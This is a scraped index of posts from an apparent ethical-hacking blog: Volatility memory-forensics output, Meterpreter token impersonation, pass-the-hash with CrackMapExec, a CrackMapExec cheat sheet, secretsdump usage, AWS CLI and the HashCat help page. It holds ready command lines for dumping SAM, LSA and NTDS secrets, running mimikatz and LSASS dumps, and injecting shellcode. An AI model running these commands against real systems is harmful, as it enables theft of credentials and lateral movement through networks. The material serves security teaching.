SERVICE_KERNEL_DRIVER pcmcia pcmcia N/A0xb80e40 226 N/A SERVICE_DEMAND_START SERVICE_STOPPED SERVICE_KERNEL_DRIVER pciide pciide N/ACommand Line Arguments (cmdline)Lists process command line arguments.python3 vol.py -f memdump-001.mem windows.cmdlinePID Process Args4 System Required memory at 0x20 is not valid (process exited?)280 smss.exe \\SystemRoot\\System32\\smss.exe364 csrss.exe %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16408 wininit.exe wininit.exe440 csrss.exe %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16Loaded DLLs (dlllist)Displays the DLLs loaded by each process and their respective filepaths.python3 vol.py -f memdump-001.mem windows.dlllistPID Process Base Size Name Path LoadTime File output280 smss.exe 0x48010000 0x20000 smss.exe \\SystemRoot\\System32\\smss.exe N/A Disabled280 smss.exe 0x76f10000 0x19f000 ntdll.dll C:\\Windows\\SYSTEM32\\ntdll.dll N/A Disabled364 csrss.exe 0x499b0000 0x6000 csrss.exe C:\\Windows\\system32\\csrss.exe N/A Disabled364 csrss.exe 0x76f10000 0x19f000 ntdll.dll C:\\Windows\\SYSTEM32\\ntdll.dll N/A Disabled364 csrss.exe 0x7fefcbc0000 0x13000 CSRSRV.dll C:\\Windows\\system32\\CSRSRV.dll 2020-04-20 22:44:38.000000 Disabled364 csrss.exe 0x7fefcba0000 0x11000 basesrv.DLL C:\\Windows\\system32\\basesrv.DLL 2020-04-20 22:44:38.000000 Disabled364 csrss.exe 0x7fefcb60000 0x39000 winsrv.DLL C:\\Windows\\system32\\winsrv.DLL 2020-04-20 22:44:38.000000 Disabled364 csrss.exe 0x76cf0000 0xfa000 USER32.dll C:\\Windows\\system32\\USER32.dll 2020-04-20 22:44:38.000000 DisabledScan for Injected Code (malfind)Lists process memory ranges that potentially contain injected code.python3 vol.py -f memdump-001.mem windows.malfindPID Process Start VPN End VPN Tag Protection CommitCharge PrivateMemory File output Hexdump Disasm3180 WINWORD.EXE 0x7ff072f0000 0x7ff072f9fff VadS PAGE_EXECUTE_READWRITE 10 1 Disabled00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........00 00 00 00 00 00 00 00 ........0x7ff072f0000: add byte ptr [rax], al0x7ff072f0002: add byte ptr [rax], al0x7ff072f0004: add byte ptr [rax], alNetwork Connections (netstat)Traverses network tracking structures present in a particular windows memory image.python3 vol.py -f memdump-001.mem windows.netstatOffset Proto LocalAddr LocalPort ForeignAddr ForeignPort State PID Owner Created0xfa803340b500 TCPv4 192.168.10.146 49174 172.253.122.188 5228 FIN_WAIT2 - - N/A0xfa803388f540 TCPv4 192.168.10.146 54279 151.101.116.106 443 ESTABLISHED - - N/ANetwork Connections (netscan)Scans for network objects present in a particular windows memory image.python3 vol.py -f memdump-001.mem windows.netscanOffset Proto LocalAddr LocalPort ForeignAddr ForeignPort State PID Owner Created0x13d48f540 TCPv4 192.168.10.146 54279 151.101.116.106 443 ESTABLISHED - - N/A0x13d518710 UDPv4 0.0.0.0 5355 * 0 1160 svchost.exe 2020-04-20 23:23:00.000000 0x13d518710 UDPv6 :: 5355 * 0 1160 svchost.exe 2020-04-20 23:23:00.000000 0x13d636ee0 TCPv4 0.0.0.0 49156 0.0.0.0 0 LISTENING 2032 svchost.exe -0x13d63eac0 TCPv4 0.0.0.0 49156 0.0.0.0 0 LISTENING 2032 svchost.exe -0x13d63eac0 TCPv6 :: 49156 :: 0 LISTENING 2032 svchost.exe -Dump LM/NT Hashes (hashdump)Dump the LM and NT Hashes for accounts from the memory image.python3 vol.py -f memdump-001.mem windows.hashdumpUser rid lmhash nthashAdministrator 500 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0Guest 501 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0Warren 1000 aad3b435b51404eeaad3b435b51404ee 2aa81fb8c8cdfd8f420f7f94615036b0References Volatility Foundation &#8617; " }, { "title": "CAPEC 633 - Token Impersonation", "url": "/posts/Token_Impersonation/", "categories": "Ethical Hacking, CAPEC", "tags": "privilege escalation (TA0004), metasploit, meterpreter", "date": "2022-10-25 00:00:00 +1100", "snippet": "OverviewAn adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary. 1Adversaries may duplicate then impersonate another user’s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user’s security context, or with SetThreadToken to assign the impersonated token to a thread.An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system. 2There are two types of Tokens of interest: Delegate: Interactive access to hosts Impersonate: Non-interactive access to hostsSteps to Interface with TokensMetasploits Meterpreter has a built-in extension named Incognito that allows an attacker to interface with tokens on a compromised host. Once you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes. 3(meterpreter) &gt; load incognito(meterpreter) &gt; help Incognito Commands ================== Command Description ------- ----------- add_group_user Attempt to add a user to a global group with all tokens add_localgroup_user Attempt to add a user to a local group with all tokens add_user Attempt to add a user with all tokens impersonate_token Impersonate specified token list_tokens List tokens available under current user context snarf_hashes Snarf challenge/response hashes for every token Identifying Tokens: The below example shows to the command to run to list all delegation and impersonation tokens on the target host. Of note is the Administrator delegation token. (meterpreter) &gt; list_tokens -u Delegation Tokens Available ======================================== Font Driver Host\\UMFD-0 Font Driver Host\\UMFD-1 NT AUTHORITY\\LOCAL SERVICE NT AUTHORITY\\NETWORK SERVICE NT AUTHORITY\\SYSTEM darkcybe\\Administrator Window Manager\\DWM-1 Impersonation Tokens Available ======================================== No tokens available Token Impersonation: When issuing the below command to perform the token impersonation using the previously identified Administrator delegate token, proceeding commands will be executed under that account. (meterpreter) &gt; impersonate_token darkcybe\\\\Administrator [+] Delegation token available [+] Successfully impersonated user darkcybe\\Administrator Command Execution: With the Administrator account now being impersonated using the delegation token, commands can be run using the meterpreter shell. Running execute -f cmd.exe -i -t from within Meterpreter executes cmd.exe, the -i allows us to interact with the victims PC, and the -t assumes the role we just impersonated through incognito. (meterpreter) &gt; shell Process 1676 created. Channel 1 created. Microsoft Windows [Version 10.0.22623.870] (C) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32&gt; whoami whoami darkcybe\\administrator Sources CAPEC-633: Token Impersonation &#8617; MITRE ATT&amp;CK - Access Token Manipulation: Token Impersonation/Theft &#8617; Offensive Security - FUN WITH INCOGNITO &#8617; " }, { "title": "CAPEC 644 - Use of Captured Hashes (Pass The Hash)", "url": "/posts/644-Pth/", "categories": "Ethical Hacking, CAPEC", "tags": "credential access (TA0006), lateral movement (TA0008), pass the hash, crackmapexec", "date": "2022-10-25 00:00:00 +1100", "snippet": "OverviewWhen authenticating via LM or NTLM, an authenticating account’s plaintext credentials are not required by the protocols for successful authentication. Instead, the hashed credentials are used to determine if an authentication attempt is valid. If an adversary can obtain an account’s hashed credentials, the hash values can then be passed to a system or service to authenticate, without needing to brute-force the hashes to obtain their cleartext values. Successful Pass The Hash attacks result in the adversary fully authenticating as the targeted account, which can further allow the adversary to laterally move within the network, impersonate a legitimate user, and/or download/install malware to systems within the domain. This technique can be performed against any operating system that leverages the LM or NTLM protocols even if the operating system is not Windows-based, since these systems/accounts may still authenticate to a Windows domain. 1 MITRE ATT&amp;CK Use Alternate Authentication Material: Pass the Hash Techniques Explore Acquire known Windows credential hash value pairs: The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain. An adversary purchases breached Windows credential hash value pairs from the dark web. An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted. An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs. An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs. Experiment Attempt domain authentication: Try each Windows credential hash value pair until the target grants access. Manually or automatically enter each Windows credential hash value pair through the target’s interface. Exploit Impersonate: An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain Spoofing: Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks. Data Exfiltration: The adversary can obtain sensitive data contained within domain systems or applications. Steps to Conduct a PtH AttackThe following example shows how PtH attacks can be leveraged to conduct lateral movement and perform discovery commands in a compromised domain environment. Explore Acquire known Windows credential hash value pairs: Pass the Hash attacks are considered a post-compromise technique as access to a valid credential hash value is required. The credential obtained for this example is an Domain Administrator NTLM hash. Experiment Attempt domain authentication: Using the obtained credential hash, authenitcation must be attempted. The CrackMapExec framework will be used to achieve this, using the smb pass the hash module crackmapexec smb 172.16.1.31 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 # Additionally, the cracked hash can be used as a plaintext password crackmapexec smb 172.16.1.31 -u Administrator -p Password01 Exploit Data Exfiltration: For this example, a files from network shares will be downloaded # Dumping all files from accessible shares crackmapexec smb 172.16.1.31 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -M spider_plus -o READ_ONLY=false Sources CAPEC-644: Use of Captured Hashes (Pass The Hash) &#8617; " }, { "title": "CAPEC 560 - Use of Known Domain Credentials", "url": "/posts/560-Domain_Creds/", "categories": "Ethical Hacking, CAPEC", "tags": "credential access (TA0006), lateral movement (TA0008), initial access (TA0001)", "date": "2022-10-24 00:00:00 +1100", "snippet": "OverviewAttacks leveraging trusted credentials typically result in the adversary laterally moving within the local network, since users are often allowed to login to systems/applications within the network using the same password. This further allows the adversary to obtain sensitive data, download/install malware on the system, pose as a legitimate user for social engineering purposes, and more.Attacks on known passwords generally rely on the primary fact that users often reuse the same username/password combination for a variety of systems, applications, and services, coupled with poor password policies on the target system or application. Adversaries can also utilize known passwords to target Single Sign On (SSO) or cloud-based applications and services, which often don’t verify the authenticity of the user’s input. Known credentials are usually obtained by an adversary via a system/application breach and/or by purchasing dumps of credentials on the dark web. These credentials may be further gleaned via exposed configuration and properties files that contain system passwords, database connection strings, and other sensitive data. 1 MITRE ATT&amp;CK T1078 - Valid Accounts Types of Valid Domain Credential AttacksRemote Services with Stolen Credentials MITRE ATT&amp;CK T1021 - Remote Services T1114.002 - Email Collection: Remote Email Collection T1133 - External Remote Services This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed. 2Credential Stuffing MITRE ATT&amp;CK T1110.004 - Brute Force: Credential Stuffing Attacks of this kind often target management services over commonly used ports such as SSH, FTP, Telnet, LDAP, Kerberos, MySQL, and more. Additional targets include Single Sign-On (SSO) or cloud-based applications/services that utilize federated authentication protocols, and externally facing applications.The primary goal of Credential Stuffing is to achieve lateral movement and gain authenticated access to additional systems, applications, and/or services. A successfully executed Credential Stuffing attack could result in the adversary impersonating the victim or executing any action that the victim is authorized to perform.Although not technically a brute force attack, Credential Stuffing attacks can function as such if an adversary possess multiple known passwords for the same user account. This may occur in the event where an adversary obtains user credentials from multiple sources or if the adversary obtains a user’s password history for an account.Credential Stuffing attacks are similar to Password Spraying attacks CAPEC-565 regarding their targets and their overall goals. However, Password Spraying attacks do not have any insight into known username/password combinations and instead leverage common or expected passwords. This also means that Password Spraying attacks must avoid inducing account lockouts, which is generally not a worry of Credential Stuffing attacks. Password Spraying attacks may additionally lead to Credential Stuffing attacks, once a successful username/password combination is discovered. 3Further information on Credential Stuffing can be found on the OWASP Credential Stuffing page.Use of Known Kerberos Credentials MITRE ATT&amp;CK T1558 - Steal or Forge Kerberos Tickets Kerberos is the default authentication method for Windows domains and is also used across many operating systems. Attacks leveraging trusted Kerberos credentials can result in numerous consequences, depending on what Kerberos credential is stolen. For example, Kerberos service accounts are typically used to run services or scheduled tasks pertaining to authentication. However, these credentials are often weak and never expire, in addition to possessing local or domain administrator privileges. If an adversary is able to acquire these credentials, it could result in lateral movement within the domain or access to any resources the service account is privileged to access, among other things. Ultimately, successful spoofing and impersonation of trusted Kerberos credentials can lead to an adversary breaking authentication, authorization, and audit controls with the target system or application. 4Use of Known Operating System Credentials MITRE ATT&amp;CK T1078 - Valid Accounts An adversary guesses or obtains (i.e. steals or purchases) legitimate operating system credentials (e.g. userID/password) to achieve authentication and to perform authorized actions on the system, under the guise of an authenticated user or service. This applies to any Operating System. 5Techniques Explore Acquire known credentials: The adversary must obtain known operating system credentials in order to access the target system, application, or service within the domain. An adversary purchases breached operating system username/password combinations or leaked hashed passwords from the dark web. An adversary leverages a key logger or phishing attack to steal user credentials as they are provided. An adversary conducts a sniffing attack to steal operating system credentials as they are transmitted. An adversary gains access to a system/files and exfiltrates password hashes. An adversary examines outward-facing configuration and properties files to discover hardcoded credentials. Determine target’s password policy: Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria. Determine minimum and maximum allowed password lengths. Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary). Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account). Experiment Attempt authentication: Try each operating system credential against various systems, applications, and services within the domain until the target grants access. Manually or automatically enter each credential through the target’s interface. Exploit Impersonate: An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the network Spoofing: Malicious data can be injected into the target system or into other systems on the network. The adversary can also pose as a legitimate user to perform social engineering attacks. Data Exfiltration: The adversary can obtain sensitive data contained within system files or application configuration. Sources CAPEC - 560 &#8617; CAPEC - 555 &#8617; CAPEC - 600 &#8617; CAPEC - 652 &#8617; CAPEC - 553 &#8617; " }, { "title": "CrackMapExec", "url": "/posts/CrackMapExec/", "categories": "Ethical Hacking Tools, Frameworks and Suites", "tags": "crackmapexec, ldap, winrm, smb, ssh, mssql, pth", "date": "2022-10-24 00:00:00 +1100", "snippet": "OverviewCrackMapExec (CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of “Living off the Land”, abusing built-in Active Directory features/protocols to achieve it’s functionality and allowing it to evade most endpoint protection/IDS/IPS solutions. 1Kali Linux comes with CME pre-installed. 2 Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique CrackMapExec V5.3.0 Credential Access Privilege Escalation Discovery Collection Command and Control Exfiltration Execution Persistence Defense Evasion Lateral Movement   CrackMapExec ModulesCME contains a multitude of modules that can be executed, using the -L parameter will list the available standalone modules that can be used against a target. The --options switch can be added following the module to gain further information.Lateral MovementPass The Hash/PasswordAfter obtaining credential hashes, both the full hash or just the nt hash (second half) can be used to move laterally using Pass the Hash techniques. The following checks will attempt authentication to the entire /24 subnet though a single target may also be used.# Pass the Hashcme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c' --local-auth # For local accounts# Pass the Passwordcme 192.168.1.0/24 -u Administrator -d Domain -p Passwordcme 192.168.1.0/24 -u Administrator -d Domain -p PasswordCredential Access# Dump SAM hashescme 192.168.1.0/24 -u Administrator -d Domain -p Password --sam# Dump LSA secretscme 192.168.1.0/24 -u Administrator -d Domain -p Password --lsa# Dump the NTDS.dit from target Domain Controllerscme 192.168.1.0/24 -u Administrator -d Domain -p Password --ntds drsuapi# Run Mimikatz sekurlsa:logonpasswordscme 192.168.1.0/24 -u Administrator -d Domain -p Password -M mimikatz# Dump LSASS using nanodump and parse result with pypykatzcme 192.168.1.0/24 -u Administrator -d Domain -p Password -M nanodump# Dump LSASS using procdump and parse result with pypykatzcme 192.168.1.0/24 -u Administrator -d Domain -p Password -M procdump# Collect saved session data from PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDPcme 192.168.1.0/24 -u Administrator -d Domain -p Password -M invoke_sessiongopherDiscovery# Enumerate shares and accesscme 192.168.1.0/24 -u Administrator -d Domain -p Password --shares# Enumerate active sessionscme 192.168.1.0/24 -u Administrator -d Domain -p Password --sessions# Enumerate diskscme 192.168.1.0/24 -u Administrator -d Domain -p Password --disks# Enumerate logged on userscme 192.168.1.0/24 -u Administrator -d Domain -p Password --loggedon-users# Enumerate password policycme 192.168.1.0/24 -u Administrator -d Domain -p Password --pass-pol# Enumerate active RDP sessionscme 192.168.1.0/24 -u Administrator -d Domain -p Password -M get_netrdpsession# Spider sharescme 192.168.1.0/24 -u Administrator -d Domain -p Password --spider %SHARE%# Spider folderscme 192.168.1.0/24 -u Administrator -d Domain -p Password --spider-folder %FOLDER%Collection# File Uploadcme 192.168.1.0/24 -u Administrator -d Domain -p Password --put-file %LOCAL_FILE% %REMOTE_PATH%# File Downloadcme 192.168.1.0/24 -u Administrator -d Domain -p Password --get-file %REMOTE_PATH% %LOCAL_FILE%# Take screenshots at regular intervals. Interval in seconds, endtime in HH:MM format.cme 192.168.1.0/24 -u Administrator -d Domain -p Password -M get_timedscreenshot %INTERVAL% %ENDTIME%Execution# Command execution via smb, mmc, wmi, or atcme 192.168.1.0/24 -u Administrator -d Domain -p Password --exec-method {`smbexec`,`mmcexec`,`wmiexec`,`atexec`} -x %COMMAND%# Obfuscated Powershell command execution via wmicme 192.168.1.0/24 -u Administrator -d Domain -p Password --exec-method wmiexec -X %COMMAND% --obfs# Process Injection. Path = file containing raw shellcode, ProcID = Process ID to inject (defaults to current PowerShell process)cme 192.168.1.0/24 -u Administrator -d Domain -p Password -M shellcode_inject %PATH% %PROCID%Sources CrackMapExec Wiki &#8617; Kali Linux - CrackMapExec &#8617; " }, { "title": "SecretsDump", "url": "/posts/SecretsDump/", "categories": "Ethical Hacking Tools, Credential Access", "tags": "impacket, secretsdump", "date": "2022-10-24 00:00:00 +1100", "snippet": "OverviewSecretsDump performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. 1 Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique secretsdump v0.10.00 Credential Access   SecretsDump Help Pageimpacket-secretsdump -hImpacket v0.10.0 - Copyright 2022 SecureAuth Corporationusage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-just-dc-user USERNAME] [-just-dc] [-just-dc-ntlm] [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address] [-target-ip ip address] targetPerforms various techniques to dump secrets from the remote machine without executing any agent there.positional arguments: target [[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL (if you want to parse local files)options: -h, --help show this help message and exit -ts Adds timestamp to every logging output -debug Turn DEBUG output ON -system SYSTEM SYSTEM hive to parse -bootkey BOOTKEY bootkey for SYSTEM hive -security SECURITY SECURITY hive to parse -sam SAM SAM hive to parse -ntds NTDS NTDS.DIT file to parse -resumefile RESUMEFILE resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session's state -outputfile OUTPUTFILE base output filename. Extensions will be added for sam, secrets, cached and ntds -use-vss Use the VSS method instead of default DRSUAPI -rodcNo RODCNO Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach) -rodcKey RODCKEY AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach) -use-keylist Use the Kerb-Key-List method instead of default DRSUAPI -exec-method [{smbexec,wmiexec,mmcexec}] Remote exec method to use at target (only when using -use-vss). Default: smbexecdisplay options: -just-dc-user USERNAME Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch -just-dc Extract only NTDS.DIT data (NTLM hashes and Kerberos keys) -just-dc-ntlm Extract only NTDS.DIT data (NTLM hashes only) -pwd-last-set Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data -user-status Display whether or not the user is disabled -history Dump password history, and LSA secrets OldValauthentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don't ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) -keytab KEYTAB Read keys for SPN from keytab fileconnection: -dc-ip ip address IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter -target-ip ip address IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve itInstructionsDumping all available credentials from a remote targetimpacket-secretsdump %DOMAIN%/%USERNAME%:%PASSWORD%@%IP%Sources SecureAuth - IMPACKET &#8617; " }, { "title": "Amazon Web Services (AWS)", "url": "/posts/AWS/", "categories": "Ethical Hacking, Cloud", "tags": "aws, s3, aws-cli", "date": "2022-10-23 00:00:00 +1100", "snippet": "OverviewAmazon Web Services (AWS) is the world’s most comprehensive and broadly adopted cloud platform, offering over 200 fully featured services from data centers globally. 1. Certain products can be configured to be publicly accessible queryable via the internet, leaving the door ajar for attacks against the hosted platforms.However, it is important to note that certain products can be configured to be publicly accessible and queryable via the internet, which can leave the door open for attacks against the hosted platforms. This is especially true for products that are used for compute, storage, and containers, as these are typically the most vulnerable to attacks.Some of the more commonly encountered AWS products that may be at risk of attack include: Cloud Infrastructure (EC2): This service allows users to rent virtual computers on which they can run their own applications. If these virtual computers are not properly configured, they may be vulnerable to attacks. Cloud Containers (ECS): This service allows users to run containerized applications in the cloud. If the containers are not properly secured, they may be vulnerable to attacks. Cloud Storage (S3): This service allows users to store and retrieve data in the cloud. If the storage is not properly configured, it may be vulnerable to attacks.It is important for users of AWS products to properly configure and secure their deployments to prevent attacks against their hosted platforms. This can include using strong passwords and access controls, applying security updates and patches, and monitoring for suspicious activity.Interacting with AWS via the AWS-CLIThe AWS Command Line Interface (AWS CLI) is a unified tool to manage your AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts. 2The AWS-CLI must first be configured prior to use. If details have not been obtained, arbitrary entries may be used in an attempt of unauthenticated access.aws configure# AWS Access Key ID [None]: accesskey# AWS Secret Access Key [None]: secretkey# Default region name [None]: us-west-2# Default output format [None]:A full list of commands can be found on the AWS - CLI Command Reference page.Cloud Storage (S3)Once AWS-CLI is installed and configured, you can use the following commands to interact with S3: 3 Command Description Example Command Line aws s3 ls List the contents of an S3 bucket. aws s3 ls s3://my-bucket aws s3 cp Copy a file to or from an S3 bucket. aws s3 cp /local/path/file.txt s3://my-bucket/file.txt aws s3 cp Copy multiple files to or from an S3 bucket. aws s3 cp /myfolder s3://mybucket/myfolder –recursive upload: myfolder/file1.txt to s3://mybucket/myfolder/file1.txt upload: myfolder/subfolder/file1.txt to s3://mybucket/myfolder/subfolder/file1.txt aws s3 mv Move a file within an S3 bucket or to a different bucket. aws s3 mv s3://my-bucket/file.txt s3://my-other-bucket/file.txt aws s3 rm Delete a file from an S3 bucket. aws s3 rm s3://my-bucket/file.txt aws s3 sync Synchronize the contents of a local directory with an S3 bucket. aws s3 sync /local/path/ s3://my-bucket/ References AWS - What is AWS? &#8617; AWS - CLI &#8617; AWS - S3 &#8617; " }, { "title": "HashCat", "url": "/posts/HashCat/", "categories": "Ethical Hacking Tools, Credential Access", "tags": "hashcat, password cracking", "date": "2022-10-22 00:00:00 +1100", "snippet": "OverviewHashCat is a password cracking utility that allows various offline password attacks in order to reveal plaintext passwords from collection password hashes. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique HashCat v6.2.6 Credential Access   HashCat Help Pagehashcat -h hashcat (v6.2.6) starting in help modeUsage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...- [ Options ] - Options Short / Long | Type | Description | Example================================+======+======================================================+======================= -m, --hash-type | Num | Hash-type, references below (otherwise autodetect) | -m 1000 -a, --attack-mode | Num | Attack-mode, see references below | -a 3 -V, --version | | Print version | -h, --help | | Print help | --quiet | | Suppress output | --hex-charset | | Assume charset is given in hex | --hex-salt | | Assume salt is given in hex | --hex-wordlist | | Assume words in wordlist are given in hex | --force | | Ignore warnings | --deprecated-check-disable | | Enable deprecated plugins | --status | | Enable automatic update of the status screen | --status-json | | Enable JSON format for status output | --status-timer | Num | Sets seconds between status screen updates to X | --status-timer=1 --stdin-timeout-abort | Num | Abort if there is no input from stdin for X seconds | --stdin-timeout-abort=300 --machine-readable | | Display the status view in a machine-readable format | --keep-guessing | | Keep guessing the hash after it has been cracked | --self-test-disable | | Disable self-test functionality on startup | --loopback | | Add new plains to induct directory | --markov-hcstat2 | File | Specify hcstat2 file to use | --markov-hcstat2=my.hcstat2 --markov-disable | | Disables markov-chains, emulates classic brute-force | --markov-classic | | Enables classic markov-chains, no per-position | --markov-inverse | | Enables inverse markov-chains, no per-position | -t, --markov-threshold | Num | Threshold X when to stop accepting new markov-chains | -t 50 --runtime | Num | Abort session after X seconds of runtime | --runtime=10 --session | Str | Define specific session name | --session=mysession --restore | | Restore session from --session | --restore-disable | | Do not write restore file | --restore-file-path | File | Specific path to restore file | --restore-file-path=x.restore -o, --outfile | File | Define outfile for recovered hash | -o outfile.txt --outfile-format | Str | Outfile format to use, separated with commas | --outfile-format=1,3 --outfile-autohex-disable | | Disable the use of $HEX[] in output plains | --outfile-check-timer | Num | Sets seconds between outfile checks to X | --outfile-check-timer=30 --wordlist-autohex-disable | | Disable the conversion of $HEX[] from the wordlist | -p, --separator | Char | Separator char for hashlists and outfile | -p : --stdout | | Do not crack a hash, instead print candidates only | --show | | Compare hashlist with potfile; show cracked hashes | --left | | Compare hashlist with potfile; show uncracked hashes | --username | | Enable ignoring of usernames in hashfile | --remove | | Enable removal of hashes once they are cracked | --remove-timer | Num | Update input hash file each X seconds | --remove-timer=30 --potfile-disable | | Do not write potfile | --potfile-path | File | Specific path to potfile | --potfile-path=my.pot --encoding-from | Code | Force internal wordlist encoding from X | --encoding-from=iso-8859-15 --encoding-to | Code | Force internal wordlist encoding to X | --encoding-to=utf-32le --debug-mode | Num | Defines the debug mode (hybrid only by using rules) | --debug-mode=4 --debug-file | File | Output file for debugging rules | --debug-file=good.log --induction-dir | Dir | Specify the induction directory to use for loopback | --induction=inducts --outfile-check-dir | Dir | Specify the outfile directory to monitor for plains | --outfile-check-dir=x --logfile-disable | | Disable the logfile | --hccapx-message-pair | Num | Load only message pairs from hccapx matching X | --hccapx-message-pair=2 --nonce-error-corrections | Num | The BF size range to replace AP's nonce last bytes | --nonce-error-corrections=16 --keyboard-layout-mapping | File | Keyboard layout mapping table for special hash-modes | --keyb=german.hckmap --truecrypt-keyfiles | File | Keyfiles to use, separated with commas | --truecrypt-keyf=x.png --veracrypt-keyfiles | File | Keyfiles to use, separated with commas | --veracrypt-keyf=x.txt --veracrypt-pim-start | Num | VeraCrypt personal iterations multiplier start | --veracrypt-pim-start=450 --veracrypt-pim-stop | Num | VeraCrypt personal iterations multiplier stop | --veracrypt-pim-stop=500 -b, --benchmark | | Run benchmark of selected hash-modes | --benchmark-all | | Run benchmark of all hash-modes (requires -b) | --speed-only | | Return expected speed of the attack, then quit | --progress-only | | Return ideal progress step size and time to process | -c, --segment-size | Num | Sets size in MB to cache from the wordfile to X | -c 32 --bitmap-min | Num | Sets minimum bits allowed for bitmaps to X | --bitmap-min=24 --bitmap-max | Num | Sets maximum bits allowed for bitmaps to X | --bitmap-max=24 --cpu-affinity | Str | Locks to CPU devices, separated with commas | --cpu-affinity=1,2,3 --hook-threads | Num | Sets number of threads for a hook (per compute unit) | --hook-threads=8 --hash-info | | Show information for each hash-mode | --example-hashes | | Alias of --hash-info | --backend-ignore-cuda | | Do not try to open CUDA interface on startup | --backend-ignore-hip | | Do not try to open HIP interface on startup | --backend-ignore-metal | | Do not try to open Metal interface on startup | --backend-ignore-opencl | | Do not try to open OpenCL interface on startup | -I, --backend-info | | Show system/evironment/backend API info | -I or -II -d, --backend-devices | Str | Backend devices to use, separated with commas | -d 1 -D, --opencl-device-types | Str | OpenCL device-types to use, separated with commas | -D 1 -O, --optimized-kernel-enable | | Enable optimized kernels (limits password length) | -M, --multiply-accel-disable | | Disable multiply kernel-accel with processor count | -w, --workload-profile | Num | Enable a specific workload profile, see pool below | -w 3 -n, --kernel-accel | Num | Manual workload tuning, set outerloop step size to X | -n 64 